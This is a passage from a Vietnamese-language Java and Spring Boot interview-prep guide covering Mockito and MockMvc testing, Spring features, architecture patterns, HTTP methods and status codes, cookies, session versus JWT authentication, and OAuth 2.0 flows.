        User(Long id, String name, String email) { this.id = id; this.name = name; this.email = email; }
    }
    interface UserRepository { User save(User user); }
    static class UserService {
        private final UserRepository repo;
        UserService(UserRepository repo) { this.repo = repo; }
        UserResponse create(CreateUserRequest req) {
            User saved = repo.save(new User(null, req.name(), req.email()));
            return new UserResponse(saved.id, saved.name, saved.email);
        }
    }

    @org.mockito.Mock UserRepository userRepository;
    @org.mockito.InjectMocks UserService userService;

    @org.junit.jupiter.api.Test
    void shouldCreateUser() {
        // Arrange
        CreateUserRequest req = new CreateUserRequest("an", "an@mail.com");
        User saved = new User(1L, "an", "an@mail.com");
        org.mockito.Mockito.when(userRepository.save(org.mockito.ArgumentMatchers.any(User.class)))
                .thenReturn(saved);

        // Act
        UserResponse res = userService.create(req);

        // Assert
        org.junit.jupiter.api.Assertions.assertEquals("an@mail.com", res.email());
        org.mockito.Mockito.verify(userRepository).save(org.mockito.ArgumentMatchers.any(User.class));
    }
}
```

---

### Q199: Mockito chi tiết (`@Mock`, `@InjectMocks`, `@Spy`, verify, captor)

**Trả lời:**

| Thành phần | Ý nghĩa |
|---|---|
| `@Mock` | Fake dependency hoàn toàn |
| `@InjectMocks` | Tạo object cần test và inject mocks vào |
| `@Spy` | Partial mock (gọi code thật trừ khi stub) |
| `when(...).thenReturn(...)` | Stub kết quả |
| `doThrow(...)` | Stub exception (thường cho void method) |
| `verify(times(n))` | Xác nhận số lần gọi |
| `ArgumentCaptor` | Bắt tham số truyền vào để assert |
| `any()`, `eq()` | Matcher cho argument |

```java
@ExtendWith(org.mockito.junit.jupiter.MockitoExtension.class)
class MailServiceTest {
    interface MailClient {
        boolean send(String to, String template);
        void close();
    }
    static class AuditService {}
    static class NotificationService {
        private final MailClient mailClient;
        NotificationService(MailClient mailClient) { this.mailClient = mailClient; }
        void sendWelcome(String email) { mailClient.send(email, "WELCOME"); }
        void shutdown() { mailClient.close(); }
    }

    @org.mockito.Mock MailClient mailClient;
    @org.mockito.InjectMocks NotificationService service;
    @org.mockito.Spy AuditService auditService = new AuditService();

    @org.junit.jupiter.api.Test
    void shouldSendMailAndCaptureArgs() {
        org.mockito.Mockito.when(mailClient.send(org.mockito.ArgumentMatchers.anyString(),
                org.mockito.ArgumentMatchers.eq("WELCOME"))).thenReturn(true);

        service.sendWelcome("user@mail.com");

        org.mockito.ArgumentCaptor<String> captor = org.mockito.ArgumentCaptor.forClass(String.class);
        org.mockito.Mockito.verify(mailClient, org.mockito.Mockito.times(1))
                .send(captor.capture(), org.mockito.ArgumentMatchers.eq("WELCOME"));
        org.junit.jupiter.api.Assertions.assertEquals("user@mail.com", captor.getValue());
    }

    @org.junit.jupiter.api.Test
    void shouldThrowWhenMailClientFails() {
        org.mockito.Mockito.doThrow(new RuntimeException("smtp down"))
                .when(mailClient).close();
        org.junit.jupiter.api.Assertions.assertThrows(RuntimeException.class, () -> service.shutdown());
    }
}
```

---

### Q200: `@SpringBootTest` vs `@WebMvcTest` vs `@DataJpaTest` vs `@MockBean`

**Trả lời:**

| Annotation | Tải context | Dùng khi |
|---|---|---|
| `@SpringBootTest` | Full app context | Integration test end-to-end trong app |
| `@WebMvcTest` | Chỉ web layer | Test controller + validation + JSON mapping |
| `@DataJpaTest` | Chỉ JPA/repository | Test query, mapping entity, transaction DB |
| `@MockBean` | Mock bean trong Spring context | Cô lập dependency thật trong test slice/full |

⚠️ Đừng lạm dụng `@SpringBootTest` cho mọi test vì chậm.

---

### Q201: MockMvc test REST Controller

**Trả lời:**

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;

import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@WebMvcTest(UserController.class)
class UserControllerTest {
    record CreateUserRequest(String name, String email) {}
    record UserResponse(Long id, String name, String email) {}
    interface UserService { UserResponse create(CreateUserRequest req); }

    @org.springframework.web.bind.annotation.RestController
    static class UserController {
        private final UserService userService;
        UserController(UserService userService) { this.userService = userService; }
        @org.springframework.web.bind.annotation.PostMapping("/api/users")
        @org.springframework.http.ResponseStatus(org.springframework.http.HttpStatus.CREATED)
        UserResponse create(@org.springframework.web.bind.annotation.RequestBody CreateUserRequest req) {
            return userService.create(req);
        }
    }

    @Autowired MockMvc mockMvc;
    @Autowired ObjectMapper objectMapper;
    @MockBean UserService userService;

    @Test
    void shouldReturn201() throws Exception {
        when(userService.create(new CreateUserRequest("an", "an@mail.com")))
                .thenReturn(new UserResponse(1L, "an", "an@mail.com"));

        mockMvc.perform(post("/api/users")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(new CreateUserRequest("an", "an@mail.com"))))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.id").value(1))
                .andExpect(jsonPath("$.email").value("an@mail.com"));
    }
}
```

---

### Q202: Code coverage và JaCoCo cơ bản

**Trả lời:**

- **Line coverage:** % dòng code được chạy.
- **Branch coverage:** % nhánh điều kiện (`if/else`, `switch`) được chạy.
- Coverage cao giúp giảm blind spot, nhưng **100% không đồng nghĩa không bug**.

⚠️ Mục tiêu thực tế: ưu tiên coverage cao ở business logic quan trọng, không chạy theo % tuyệt đối.

```xml
<!-- pom.xml -->
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution>
      <goals><goal>prepare-agent</goal></goals>
    </execution>
    <execution>
      <id>report</id>
      <phase>test</phase>
      <goals><goal>report</goal></goals>
    </execution>
  </executions>
</plugin>
```

---

### Q203: Test Pyramid (Unit > Integration > E2E)

**Trả lời:**

| Tầng | Tỷ lệ gợi ý | Mục tiêu |
|---|---|---|
| Unit test | 70–80% | Nhanh, kiểm tra logic nhỏ |
| Integration test | 15–25% | Kiểm tra tương tác module/DB/API |
| E2E test | 5–10% | Kiểm tra luồng nghiệp vụ quan trọng |

Ý nghĩa: nhiều unit test để feedback nhanh; ít E2E vì chậm và dễ flaky.

---

### Q204: Testcontainers là gì? Khi nào dùng thay H2?

**Trả lời:**

Testcontainers chạy dependency thật (PostgreSQL, MySQL, Kafka...) bằng Docker trong test.

**Nên dùng Testcontainers khi:**
- Query phụ thuộc behavior DB thật (JSONB, index, collation, transaction semantics).
- Cần test gần production hơn.

**Không nên chỉ dùng H2** cho mọi thứ vì có thể khác cú pháp/behavior so với DB thật.

```java
@org.springframework.boot.test.autoconfigure.orm.jpa.DataJpaTest
@org.testcontainers.junit.jupiter.Testcontainers
class UserRepositoryContainerTest {
    @org.testcontainers.junit.jupiter.Container
    static org.testcontainers.containers.PostgreSQLContainer<?> postgres =
            new org.testcontainers.containers.PostgreSQLContainer<>("postgres:16-alpine");
}
```

---

### Q205: Cách test method có `@Transactional`, `@Async`, `@Scheduled`

**Trả lời:**

1. **`@Transactional`:** test rollback/commit rõ ràng (thường với `@DataJpaTest` hoặc integration test).
2. **`@Async`:** chờ kết quả bằng `CompletableFuture.join()` hoặc await utility.
3. **`@Scheduled`:** tách business logic sang method thường và test trực tiếp method đó.

```java
@SpringBootTest
class PaymentServiceIT {
    @Autowired PaymentService paymentService;
    @Autowired PaymentRepository paymentRepository;

    @Test
    void shouldRollbackWhenException() {
        org.junit.jupiter.api.Assertions.assertThrows(RuntimeException.class,
                () -> paymentService.transferWithFailure());
        // assert DB state not changed
    }
}
```

⚠️ Với `@Async`, tránh assert ngay sau khi gọi nếu chưa đồng bộ hóa việc chờ task hoàn tất.

---

### Q88: AOP (Aspect-Oriented Programming) trong Spring?

AOP tách cross-cutting concerns (logging, security, transaction) ra khỏi business logic.

```java
@Aspect
@Component
public class LoggingAspect {
    private static final Logger log = LoggerFactory.getLogger(LoggingAspect.class);
    
    // Ghi log trước và sau mọi method trong service layer
    @Around("execution(* com.myapp.service.*.*(..))")
    public Object logMethodExecution(ProceedingJoinPoint joinPoint) throws Throwable {
        String methodName = joinPoint.getSignature().getName();
        log.info("→ Executing: {}", methodName);
        
        long start = System.currentTimeMillis();
        Object result = joinPoint.proceed();
        long duration = System.currentTimeMillis() - start;
        
        log.info("← Completed: {} in {} ms", methodName, duration);
        return result;
    }
    
    // Ghi log khi có exception
    @AfterThrowing(pointcut = "execution(* com.myapp..*(..))", throwing = "ex")
    public void logException(JoinPoint joinPoint, Exception ex) {
        log.error("Exception in {}: {}", joinPoint.getSignature().getName(), ex.getMessage());
    }
}

// AOP Terminology:
// Aspect: class chứa cross-cutting logic
// Advice: action thực hiện (Before, After, Around, AfterReturning, AfterThrowing)
// Pointcut: expression chỉ định where to apply
// JoinPoint: điểm trong execution flow nơi aspect được apply
```

---

### Q89: Scheduler trong Spring Boot?

```java
@Configuration
@EnableScheduling
public class SchedulerConfig { }

@Component
public class ScheduledTasks {
    
    @Scheduled(fixedRate = 5000)  // mỗi 5 giây
    public void reportCurrentTime() {
        log.info("Current Time: {}", LocalDateTime.now());
    }
    
    @Scheduled(fixedDelay = 10000)  // 10 giây SAU KHI task trước hoàn thành
    public void cleanupExpiredTokens() {
        tokenService.deleteExpired();
    }
    
    @Scheduled(cron = "0 0 2 * * ?")  // 2AM mỗi ngày
    public void generateDailyReport() {
        reportService.generateDaily();
    }
    
    // Cron format: second minute hour day month weekday
    // "0 */15 * * * ?" = mỗi 15 phút
    // "0 0 9-17 * * MON-FRI" = mỗi giờ từ 9-17h, thứ 2-6
}
```

---

### Q90: WebSocket vs REST?

| | REST | WebSocket |
|--|------|-----------|
| Giao tiếp | Request-Response | Full-duplex |
| Connection | Stateless, tạo mới mỗi request | Persistent connection |
| Phù hợp | CRUD operations | Real-time (chat, notifications, live data) |
| Protocol | HTTP | ws:// hoặc wss:// |
| Overhead | Cao (headers mỗi request) | Thấp sau khi connect |

```java
// Spring WebSocket config
@Configuration
@EnableWebSocketMessageBroker
public class WebSocketConfig implements WebSocketMessageBrokerConfigurer {
    @Override
    public void configureMessageBroker(MessageBrokerRegistry config) {
        config.enableSimpleBroker("/topic");
        config.setApplicationDestinationPrefixes("/app");
    }
    @Override
    public void registerStompEndpoints(StompEndpointRegistry registry) {
        registry.addEndpoint("/ws").withSockJS();
    }
}
```

---

# PHẦN 8: CÂU HỎI BEHAVIORAL & SCENARIO

---

### Q91: Bạn xử lý thế nào khi có một bug trên production?

1. **Assess:** Xác định mức độ nghiêm trọng (critical? affect bao nhiêu users?).
2. **Communicate:** Thông báo team lead/manager, update status page nếu cần.
3. **Hotfix:** Tạo hotfix branch từ main, fix bug, test kỹ.
4. **Deploy:** Deploy hotfix sau review, monitor closely.
5. **Post-mortem:** Phân tích root cause, cập nhật test để tránh lặp lại.

---

### Q92: Bạn tối ưu performance cho API chậm như thế nào?

1. **Profiling:** Dùng APM tools (New Relic, Datadog) xác định bottleneck.
2. **Database:** Kiểm tra slow queries, thêm index, tối ưu N+1, pagination.
3. **Caching:** Redis/Caffeine cho data ít thay đổi.
4. **Code:** Tránh computation không cần thiết, dùng async khi có thể.
5. **Infrastructure:** Connection pooling, scale horizontally, CDN cho static content.
6. **Measure:** Trước và sau tối ưu, đo bằng metrics cụ thể.

---

### Q93: Giải thích về 12-Factor App?

12 nguyên tắc xây dựng SaaS applications hiện đại:

1. **Codebase:** Một codebase trong VCS, nhiều deploys.
2. **Dependencies:** Khai báo explicit, không dựa vào system packages.
3. **Config:** Lưu config trong environment variables.
4. **Backing services:** Treat databases, queues như attached resources.
5. **Build, release, run:** Tách biệt 3 giai đoạn.
6. **Processes:** Stateless, share-nothing.
7. **Port binding:** Export services via port.
8. **Concurrency:** Scale out via process model.
9. **Disposability:** Fast startup, graceful shutdown.
10. **Dev/prod parity:** Keep environments similar.
11. **Logs:** Treat as event streams.
12. **Admin processes:** Run as one-off processes.

---

### Q94: Event-Driven Architecture là gì?

Kiến trúc dựa trên sự kiện, các service giao tiếp qua events thay vì gọi trực tiếp.

```
Order Service ──publish──→ [OrderCreated Event]
                                    │
                    ┌───────────────┼───────────────┐
                    ▼               ▼               ▼
            Payment Service   Inventory Service  Email Service
            (process payment) (reserve stock)   (send confirmation)
```

**Ưu điểm:** Loose coupling, scalable, resilient.
**Nhược điểm:** Complex, eventual consistency, debugging khó hơn.

**Event Sourcing:** Lưu tất cả events thay vì state hiện tại. State được tính bằng cách replay events.

**CQRS (Command Query Responsibility Segregation):** Tách read model và write model.

---

### Q95: Database Migration với Flyway/Liquibase?

```sql
-- Flyway: file V1__Create_users_table.sql
CREATE TABLE users (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- V2__Add_role_to_users.sql
ALTER TABLE users ADD COLUMN role VARCHAR(20) DEFAULT 'USER';
```

```yaml
# application.yml
spring:
  flyway:
    enabled: true
    locations: classpath:db/migration
    baseline-on-migrate: true
```

---

### Q96: Giải thích Saga Pattern?

Quản lý distributed transactions trong microservices bằng chuỗi local transactions.

**Choreography (event-driven):**
```
Order Service → OrderCreated →
Payment Service → PaymentCompleted →
Inventory Service → StockReserved →
Notification Service → Done

Nếu fail: mỗi service listen compensation events để rollback
```

**Orchestration (central coordinator):**
```
Saga Orchestrator:
  1. Gọi Order Service → tạo order
  2. Gọi Payment Service → charge
  3. Nếu payment fail → gọi Order Service → cancel order
  4. Nếu OK → gọi Inventory Service → reserve stock
  5. Tất cả OK → hoàn tất
```

---

### Q97: Rate Limiting và API Throttling?

```java
// Bucket4j - Token Bucket algorithm
@Component
public class RateLimitFilter implements Filter {
    
    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();
    
    private Bucket createBucket() {
        return Bucket.builder()
            .addLimit(Bandwidth.classic(100, Refill.intervally(100, Duration.ofMinutes(1))))
            .build();
    }
    
    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        String clientIP = request.getRemoteAddr();
        
        Bucket bucket = buckets.computeIfAbsent(clientIP, k -> createBucket());
        
        if (bucket.tryConsume(1)) {
            chain.doFilter(req, resp);
        } else {
            HttpServletResponse response = (HttpServletResponse) resp;
            response.setStatus(429); // Too Many Requests
            response.getWriter().write("Rate limit exceeded");
        }
    }
}
```

---

### Q98: Health Check & Graceful Shutdown?

```yaml
# Health check
management:
  endpoint:
    health:
      show-details: always
  health:
    db:
      enabled: true
    redis:
      enabled: true

# Graceful shutdown
server:
  shutdown: graceful
spring:
  lifecycle:
    timeout-per-shutdown-phase: 30s
```

```java
// Custom health indicator
@Component
public class ExternalServiceHealthIndicator implements HealthIndicator {
    @Override
    public Health health() {
        boolean isUp = checkExternalService();
        return isUp ? Health.up().withDetail("service", "reachable").build()
                    : Health.down().withDetail("service", "unreachable").build();
    }
}
```

---

### Q99: OpenAPI/Swagger documentation?

```java
// pom.xml: springdoc-openapi-starter-webmvc-ui

@OpenAPIDefinition(
    info = @Info(title = "User API", version = "1.0", description = "User management API")
)
@RestController
@RequestMapping("/api/users")
@Tag(name = "Users", description = "User management operations")
public class UserController {

    @Operation(summary = "Get user by ID", description = "Returns a single user")
    @ApiResponses({
        @ApiResponse(responseCode = "200", description = "User found"),
        @ApiResponse(responseCode = "404", description = "User not found")
    })
    @GetMapping("/{id}")
    public UserResponse getUser(@Parameter(description = "User ID") @PathVariable Long id) {
        return userService.getById(id);
    }
}

// Truy cập: http://localhost:8080/swagger-ui.html
```


---

### Q100: Một số câu hỏi scenario thường gặp?

**"Thiết kế hệ thống URL shortener"**
- Database: lưu mapping short_code → original_url
- Tạo short code: Base62 encoding, random, hoặc counter-based
- Cache: Redis cache popular URLs
- Scale: read-heavy → nhiều replica, CDN

**"Thiết kế hệ thống e-commerce đơn giản"**
- Services: User, Product, Order, Payment, Notification
- Database per service
- Saga pattern cho order flow
- Event-driven cho notifications
- Cache product catalog

**"Tối ưu API trả về 10,000 records"**
- Pagination (cursor-based cho large datasets)
- Projection (chỉ select fields cần thiết)
- Compression (gzip response)
- Caching
- Async processing nếu không cần real-time

# PHẦN BỔ SUNG: HTTP, WEB FUNDAMENTALS & GIAO TIẾP

---

# A. HTTP PROTOCOL

---

## Q101: HTTP là gì? Đặc điểm?

**HTTP (HyperText Transfer Protocol):** Giao thức tầng ứng dụng (Application Layer) để truyền tải dữ liệu trên web, hoạt động theo mô hình **Request-Response**.

**Đặc điểm chính:**
- **Stateless:** Mỗi request độc lập, server không nhớ request trước.
- **Text-based:** Human-readable (headers, status line).
- **Connectionless (HTTP/1.0):** Đóng connection sau mỗi request.
- **Persistent (HTTP/1.1+):** Tái sử dụng connection (`Connection: keep-alive`).
- **Flexible:** Truyền bất kỳ loại data nào (HTML, JSON, image, video...).

---

## Q102: Cấu trúc HTTP Request và Response?

```
═══════════ HTTP REQUEST ═══════════

POST /api/users HTTP/1.1              ← Request Line (Method + URI + Version)
Host: api.example.com                 ← Headers
Content-Type: application/json
Authorization: Bearer eyJhbGciOi...
Accept: application/json
Content-Length: 52
                                      ← Blank line (phân cách header và body)
{"name": "John", "email": "j@m.com"} ← Body (optional)


═══════════ HTTP RESPONSE ═══════════

HTTP/1.1 201 Created                  ← Status Line (Version + Status Code + Reason)
Content-Type: application/json        ← Headers
Location: /api/users/42
Cache-Control: no-cache
Set-Cookie: session=abc123; HttpOnly
                                      ← Blank line
{"id": 42, "name": "John"}           ← Body
```

---

## Q103: HTTP Methods chi tiết?

| Method | Mục đích | Body | Idempotent | Safe | Cacheable |
|--------|---------|------|-----------|------|-----------|
| GET | Lấy resource | Không | Có | Có | Có |
| POST | Tạo mới resource | Có | Không | Không | Không |
| PUT | Thay thế toàn bộ resource | Có | Có | Không | Không |
| PATCH | Cập nhật một phần | Có | Không* | Không | Không |
| DELETE | Xóa resource | Có thể | Có | Không | Không |
| HEAD | Như GET nhưng chỉ trả header | Không | Có | Có | Có |
| OPTIONS | Lấy methods được hỗ trợ | Không | Có | Có | Không |

**Giải thích:**
- **Idempotent:** Gọi nhiều lần cho cùng kết quả. PUT /users/1 với cùng body → luôn cùng kết quả. POST /users → tạo nhiều user.
- **Safe:** Không thay đổi state server. GET chỉ đọc, không ghi.

```
GET /api/users/1          → Trả về user 1
POST /api/users           → Tạo user mới, mỗi lần gọi tạo 1 user mới
PUT /api/users/1          → Thay thế toàn bộ user 1, gọi 10 lần = gọi 1 lần
PATCH /api/users/1        → Cập nhật một phần user 1
DELETE /api/users/1       → Xóa user 1, gọi lại lần 2 vẫn = đã xóa
HEAD /api/users/1         → Chỉ trả headers, kiểm tra resource tồn tại không
OPTIONS /api/users        → Trả về: Allow: GET, POST, PUT, DELETE
```

---

## Q104: HTTP Status Codes chi tiết?

### 1xx — Informational
```
100 Continue              → Server đã nhận headers, client tiếp tục gửi body
101 Switching Protocols   → Chuyển protocol (ví dụ: upgrade lên WebSocket)
```

### 2xx — Success
```
200 OK                    → Request thành công (GET, PUT, PATCH)
201 Created               → Resource đã được tạo (POST)
202 Accepted              → Request đã nhận, đang xử lý async
204 No Content            → Thành công nhưng không có body (DELETE)
```

### 3xx — Redirection
```
301 Moved Permanently     → Resource đã chuyển vĩnh viễn (SEO: chuyển ranking)
302 Found                 → Chuyển tạm thời (giữ method gốc trong thực tế thường đổi sang GET)
304 Not Modified          → Cache vẫn valid, dùng bản local
307 Temporary Redirect    → Giống 302 nhưng GIỮ NGUYÊN method (POST vẫn là POST)
308 Permanent Redirect    → Giống 301 nhưng GIỮ NGUYÊN method
```

### 4xx — Client Error
```
400 Bad Request           → Request sai format, validation fail
401 Unauthorized          → Chưa xác thực (thiếu/sai credentials)
403 Forbidden             → Đã xác thực nhưng KHÔNG có quyền
404 Not Found             → Resource không tồn tại
405 Method Not Allowed    → Method không được hỗ trợ cho URI này
406 Not Acceptable        → Server không thể trả format client yêu cầu (Accept header)
408 Request Timeout       → Client gửi quá chậm
409 Conflict              → Conflict với state hiện tại (duplicate, version conflict)
413 Payload Too Large     → Body quá lớn
415 Unsupported Media Type → Content-Type không được hỗ trợ
422 Unprocessable Entity  → Syntax OK nhưng logic sai (semantic errors)
429 Too Many Requests     → Rate limit exceeded
```

### 5xx — Server Error
```
500 Internal Server Error → Lỗi server không xác định
502 Bad Gateway           → Upstream server trả response invalid
503 Service Unavailable   → Server quá tải hoặc đang maintenance
504 Gateway Timeout       → Upstream server không phản hồi kịp
```

**Phân biệt hay bị nhầm:**
```
401 vs 403:
  401 = "Bạn chưa đăng nhập" → cần gửi credentials
  403 = "Bạn đã đăng nhập nhưng không có quyền" → đăng nhập lại cũng vô ích

400 vs 422:
  400 = Request sai format hoàn toàn (JSON parse error, thiếu required field)
  422 = Format đúng nhưng logic sai (email đã tồn tại, ngày hết hạn < ngày hiện tại)

301 vs 302 vs 307:
  301 = Chuyển vĩnh viễn, browser cache redirect, có thể đổi method
  302 = Chuyển tạm, KHÔNG nên cache, trong thực tế thường đổi POST → GET
  307 = Chuyển tạm, giữ nguyên method (POST vẫn POST)
```

---

## Q105: HTTP Headers quan trọng?

### Request Headers
```
Host: api.example.com              → Domain đích (bắt buộc trong HTTP/1.1)
Authorization: Bearer <token>      → Xác thực
Content-Type: application/json     → Loại data trong body
Accept: application/json           → Loại response mong muốn
Accept-Language: vi-VN, en-US      → Ngôn ngữ ưa thích
Accept-Encoding: gzip, deflate     → Nén được hỗ trợ
User-Agent: Mozilla/5.0...         → Thông tin browser/client
Cookie: session=abc123             → Gửi cookie
If-None-Match: "etag-value"        → Conditional request (cache)
If-Modified-Since: Mon, 01 Jan...  → Conditional request (cache)
Origin: https://mysite.com         → Origin gửi request (CORS)
Referer: https://mysite.com/page   → Trang trước đó
X-Request-ID: uuid-123             → Tracking request (custom header)
```

### Response Headers
```
Content-Type: application/json; charset=utf-8   → Loại data trả về
Content-Length: 1234                             → Kích thước body (bytes)
Cache-Control: max-age=3600, public             → Chính sách cache
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4" → Phiên bản resource
Last-Modified: Wed, 09 Oct 2024 08:15:00 GMT     → Lần sửa cuối
Location: /api/users/42                          → URI resource mới (với 201, 3xx)
Set-Cookie: token=abc; HttpOnly; Secure          → Set cookie
Access-Control-Allow-Origin: https://mysite.com  → CORS
Retry-After: 120                                 → Chờ bao lâu (với 429, 503)
X-RateLimit-Limit: 100                           → Giới hạn rate
X-RateLimit-Remaining: 42                        → Còn lại bao nhiêu
```

### Content-Type phổ biến
```
application/json                → JSON data (REST API phổ biến nhất)
application/xml                 → XML data
application/x-www-form-urlencoded → Form data (key=value&key2=value2)
multipart/form-data             → Upload file
text/html                       → HTML page
text/plain                      → Plain text
application/octet-stream        → Binary data (download file)
image/png, image/jpeg           → Hình ảnh
```

---

## Q106: HTTP/1.0 vs HTTP/1.1 vs HTTP/2 vs HTTP/3?

| Tiêu chí | HTTP/1.0 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|-----------|----------|----------|--------|--------|
| Năm | 1996 | 1997 | 2015 | 2022 |
| Connection | 1 request/conn | Keep-alive (reuse) | Multiplexing | Multiplexing |
| Head-of-line blocking | Có | Có (pipelining giải quyết 1 phần) | Giải quyết ở HTTP layer | Giải quyết hoàn toàn |
| Header | Text | Text | Binary, HPACK compressed | Binary, QPACK compressed |
| Server Push | Không | Không | Có | Có |
| Protocol | TCP | TCP | TCP + TLS | QUIC (UDP + TLS) |

```
HTTP/1.1:
  Request 1 ──────→  Response 1
  Request 2 ──────→  Response 2   (phải chờ lần lượt trên 1 connection)
  Request 3 ──────→  Response 3

HTTP/2 Multiplexing:
  Request 1 ─┐
  Request 2 ─┼──→  Responses đan xen trên 1 connection
  Request 3 ─┘     (không cần chờ nhau)

HTTP/3:
  Giống HTTP/2 nhưng dùng QUIC thay TCP
  → Không bị TCP head-of-line blocking
  → Handshake nhanh hơn (0-RTT hoặc 1-RTT)
```

---

## Q107: HTTPS và SSL/TLS?

**HTTPS = HTTP + TLS/SSL** — mã hóa toàn bộ communication.

### TLS Handshake (simplified):
```
Client                                    Server
  │                                         │
  │──── ClientHello (TLS version, ciphers)──→│
  │                                         │
  │←── ServerHello (chosen cipher) ─────────│
  │←── Server Certificate (public key) ─────│
  │←── ServerHelloDone ─────────────────────│
  │                                         │
  │──── ClientKeyExchange ──────────────────→│
  │     (pre-master secret, encrypted       │
  │      with server's public key)          │
  │──── ChangeCipherSpec ───────────────────→│
  │──── Finished (encrypted) ───────────────→│
  │                                         │
  │←── ChangeCipherSpec ────────────────────│
  │←── Finished (encrypted) ────────────────│
  │                                         │
  │←═══ Encrypted Communication ═══════════→│
```

**Mã hóa:**
- **Asymmetric (RSA/ECDSA):** Dùng trong handshake để trao đổi key. Chậm nhưng an toàn.
- **Symmetric (AES):** Dùng sau handshake để mã hóa data. Nhanh.
- **Certificate:** Chứa public key + domain + CA signature, đảm bảo server là thật.

---

# B. COOKIES, SESSION, TOKEN

---

## Q108: Cookie hoạt động chi tiết?

```
Lần đầu truy cập:
  Client ────── GET /login ─────────→ Server
  Client ←───── Set-Cookie: sid=abc ── Server (tạo session)

Các lần sau:
  Client ────── GET /profile ────────→ Server
                Cookie: sid=abc         (tự động gửi cookie)
  Client ←───── 200 OK ──────────────── Server (nhận diện user qua sid)
```

### Cookie Attributes:
```
Set-Cookie: token=abc123;
    Domain=.example.com;       → cookie gửi cho *.example.com
    Path=/api;                 → chỉ gửi cho /api/*
    Max-Age=86400;             → hết hạn sau 24h (giây)
    Expires=Thu, 01 Jan 2026;  → hết hạn vào ngày cụ thể
    HttpOnly;                  → JavaScript KHÔNG truy cập được (chống XSS)
    Secure;                    → Chỉ gửi qua HTTPS
    SameSite=Strict;           → Chống CSRF
```

### SameSite values:
```
SameSite=Strict  → KHÔNG gửi cookie cho cross-site requests
                   (click link từ email đến site → không gửi cookie)
SameSite=Lax     → Gửi cho top-level navigation (click link)
                   KHÔNG gửi cho cross-site POST, iframe, AJAX
SameSite=None    → Gửi mọi nơi (phải kèm Secure)
```

---

## Q109: Session-based vs Token-based Authentication?

### Session-based:
```
1. Client POST /login {username, password}
2. Server tạo session, lưu trong memory/DB/Redis
3. Server trả Set-Cookie: JSESSIONID=abc123
4. Client tự động gửi cookie mỗi request
5. Server lookup session từ JSESSIONID

Ưu điểm: Dễ revoke (xóa session), server kiểm soát hoàn toàn
Nhược điểm: Server phải lưu state, khó scale horizontal
            (cần sticky session hoặc shared session store)
```

### Token-based (JWT):
```
1. Client POST /login {username, password}
2. Server xác thực, tạo JWT token
3. Server trả { "token": "eyJhbGci..." }
4. Client lưu token (localStorage/cookie), gửi trong header:
   Authorization: Bearer eyJhbGci...
5. Server VERIFY token (không cần lookup DB)

Ưu điểm: Stateless, dễ scale, cross-domain
Nhược điểm: Không revoke được (trừ khi dùng blacklist),
            token size lớn hơn session ID
```

```
Session-based:                    Token-based:
┌────────┐     ┌────────┐       ┌────────┐     ┌────────┐
│ Client │────→│ Server │       │ Client │────→│ Server │
│        │     │        │       │        │     │        │
│ Cookie:│     │Session │       │ Auth:  │     │ Chỉ    │
│ SID=abc│     │ Store  │       │ Bearer │     │ verify │
│        │     │{abc:   │       │ token  │     │ token  │
│        │     │ user1} │       │        │     │(không  │
│        │     │        │       │        │     │ lookup)│
└────────┘     └────────┘       └────────┘     └────────┘
   Server phải LƯU state          Server STATELESS
```

---

## Q110: OAuth 2.0 là gì? Các grant types?

OAuth 2.0 cho phép ứng dụng (third-party) truy cập resource của user mà KHÔNG cần biết password.

### Authorization Code Flow (phổ biến nhất, dùng cho web app):
```
User    →  App   →  Auth Server (Google/Facebook)  →  Resource Server

1. User click "Login with Google"
2. App redirect user đến Google:
   GET https://accounts.google.com/o/oauth2/auth?
       client_id=APP_ID&
       redirect_uri=https://myapp.com/callback&
       response_type=code&
       scope=profile email

3. User đăng nhập Google, đồng ý cấp quyền

4. Google redirect về app kèm authorization code:
   GET https://myapp.com/callback?code=AUTH_CODE

5. App gửi code + client_secret cho Google (server-to-server):
   POST https://oauth2.googleapis.com/token
   { code, client_id, client_secret, redirect_uri, grant_type=authorization_code }

6. Google trả access_token (và refresh_token)

7. App dùng access_token gọi Google API:
   GET https://www.googleapis.com/oauth2/v2/userinfo
   Authorization: Bearer ACCESS_TOKEN
```

### Các Grant Types:
```
Authorization Code    → Web app có backend (bảo mật nhất)
Authorization Code    → SPA/Mobile (kèm PKCE extension)
  + PKCE
Client Credentials    → Machine-to-machine (không có user)
Refresh Token         → Lấy access_token mới khi hết hạn

(Deprecated):
Implicit              → SPA cũ (không còn khuyên dùng)
Password              → Trusted app (không khuyên dùng)
```

### Access Token vs Refresh Token:
```
Access Token:
  - Ngắn hạn (15 phút - 1 giờ)
  - Gửi kèm mỗi API request
  - Nếu bị đánh cắp → hạn chế thiệt hại vì sớm hết hạn

Refresh Token:
  - Dài hạn (ngày - tháng)
  - Chỉ gửi đến Auth Server để lấy access token mới
  - Lưu an toàn (HttpOnly cookie, server-side)
  - Có thể revoke
```

---

# C. CORS (Cross-Origin Resource Sharing)

---

## Q111: CORS là gì? Tại sao cần?

**Same-Origin Policy:** Browser chặn request từ origin khác (khác domain/port/protocol) vì lý do bảo mật.

```
Origin = Protocol + Domain + Port

https://app.com         →  https://api.com         ✗ Khác domain
https://app.com         →  http://app.com          ✗ Khác protocol
https://app.com         →  https://app.com:8080    ✗ Khác port
https://app.com/page1   →  https://app.com/page2   ✓ Cùng origin
```

**CORS** cho phép server khai báo origins nào được phép gọi API.

### Simple Request vs Preflight Request:

```
